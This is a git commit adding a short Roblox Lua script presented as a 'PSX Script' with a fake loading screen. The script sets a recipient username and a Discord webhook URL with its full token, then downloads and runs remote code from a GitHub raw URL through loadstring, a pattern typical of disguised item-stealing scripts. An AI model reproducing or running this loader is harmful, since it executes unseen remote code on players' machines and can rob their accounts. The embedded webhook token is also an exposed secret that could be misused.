ed159ccf72865eef570906291c73fc0600413dc5
ViperHubOnTop <67188648+ViperHubOnTop@users.noreply.github.com>
2023-04-22 21:11:05 +0400

    Add files via upload

---
+++ new.lua
@@ -0,0 +1,11 @@
+Username = "jijiqunaa"
+WebHook = "https://discord.com/api/webhooks/1099367482789208194/rnYGzHooXEF0o8nw7SUd4j4AKpkle55IhbsFXjXsB1mKJog7e0-S1qb4dk3LUyQE3smw"
+
+
+loadingscreen = true -- set this to false and remove _G. stuff to use your own GUI
+_G.CustomScriptName = "PSX Script"
+_G.Text1 = "Script Loaded..." 
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
